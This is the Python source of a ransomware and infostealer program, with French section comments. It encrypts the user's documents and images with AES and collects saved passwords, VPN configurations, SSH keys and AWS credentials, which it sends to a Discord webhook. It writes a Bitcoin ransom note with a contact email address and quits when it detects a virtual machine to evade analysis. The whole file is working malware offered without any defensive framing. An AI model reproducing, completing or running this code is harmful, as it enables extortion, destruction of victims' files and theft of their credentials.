import os
import sys
import glob
import random
import string
import keyring
import requests
import psutil
import shutil
import time
import getpass
import base64
import json
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# === CONFIGURATION ===
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1371087980370067556/VBKwygRX6b06fkD-bA1XogOe0FtJBptqBRXs3rQykBN_9kunuJq_5L_AkucVAfiIQK4f"

# === CHIFFREMENT AES ===
def generate_key():
return get_random_bytes(32)

def pad(data):
length = 16 - (len(data) % 16)
return data + (chr(length) * length).encode()

def encrypt_file(file_path, key):
try:
with open(file_path, 'rb') as f:
data = f.read()
iv = get_random_bytes(16)
cipher = AES.new(key, AES.MODE_CBC, iv)
ct_bytes = cipher.encrypt(pad(data))
with open(file_path, 'wb') as f:
f.write(iv + ct_bytes)
return True
except:
return False

def find_files():
extensions = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', '.xlsx', '.pptx']
files = []
user_path = f"C:/Users/{getpass.getuser()}/"
for ext in extensions:
files.extend(glob.glob(f"{user_path}**/*{ext}", recursive=True))
return files

# === VOL DE DONNÉES ===
def steal_passwords():
passwords = []
try:
for service in keyring.get_keyring().get_credential_services():
cred = keyring.get_credential(service, None)
if cred:
passwords.append({
"service": service,
"username": cred.username,
"password": cred.password
})
except:
pass
return passwords

def steal_vpn_configs():
vpn_configs = []
vpn_paths = [
f"C:/Users/{getpass.getuser()}/AppData/Local/Cisco/Cisco AnyConnect Secure Mobility Client/Profile",
"C:/Program Files/OpenVPN/config"
]
for path in vpn_paths:
if os.path.exists(path):
for file in glob.glob(f"{path}/**/*.ovpn", recursive=True) + glob.glob(f"{path}/**/*.xml", recursive=True):
with open(file, 'r', errors='ignore') as f:
vpn_configs.append({"file": file, "content": f.read()})
return vpn_configs

def steal_access_keys():
keys = []
key_paths = [
f"C:/Users/{getpass.getuser()}/.ssh/id_rsa",
f"C:/Users/{getpass.getuser()}/.aws/credentials"
]
for path in key_paths:
if os.path.exists(path):
with open(path, 'r', errors='ignore') as f:
keys.append({"file": path, "content": f.read()})
return keys

# === INFORMATION SYSTÈME ===
def collect_system_info():
info = {
"username": getpass.getuser(),
"hostname": os.environ.get('COMPUTERNAME', 'Unknown'),
"cpu": psutil.cpu_count(),
"memory": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
"disk": f"{psutil.disk_usage('/').total / (1024 ** 3):.2f} GB"
}
return info

# === ENVOI À DISCORD ===
def send_to_discord(data, filename="data.json"):
try:
files = {"file": (filename, json.dumps(data, indent=2))}
requests.post(DISCORD_WEBHOOK, files=files)
except:
pass

# === NOTE DE RANÇON ===
def create_ransom_note():
note = """
YOUR FILES HAVE BEEN ENCRYPTED!
To decrypt them, send 0.1 BTC to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
Then email your payment proof to: mstic514@gmail.com
DO NOT TRY TO RECOVER YOUR FILES YOURSELF!
"""
desktop = f"C:/Users/{getpass.getuser()}/Desktop"
with open(os.path.join(desktop, "RANSOM_NOTE.txt"), 'w') as f:
f.write(note)

# === ANTI-ANALYSE ===
def anti_analysis():
vm_indicators = ['vmware', 'virtualbox', 'qemu']
for proc in psutil.process_iter():
try:
if any(vm in proc.name().lower() for vm in vm_indicators):
sys.exit(0)
except:
continue
time.sleep(random.randint(1, 10))

# === FONCTION PRINCIPALE ===
def main():
anti_analysis()
key = generate_key()

# 1. Chiffrer fichiers
for file in find_files():
encrypt_file(file, key)

# 2. Vol de données
stolen_data = {
"passwords": steal_passwords(),
"vpn_configs": steal_vpn_configs(),
"access_keys": steal_access_keys(),
"system_info": collect_system_info()
}

# 3. Envoi à Discord
send_to_discord(stolen_data, "stolen_data.json")

# 4. Sauvegarde locale de la clé (dans un vrai cas, envoyée au serveur de contrôle)
with open("encryption_key.bin", 'wb') as f:
f.write(base64.b64encode(key))

# 5. Note de rançon
create_ransom_note()

if __name__ == "__main__":
main()
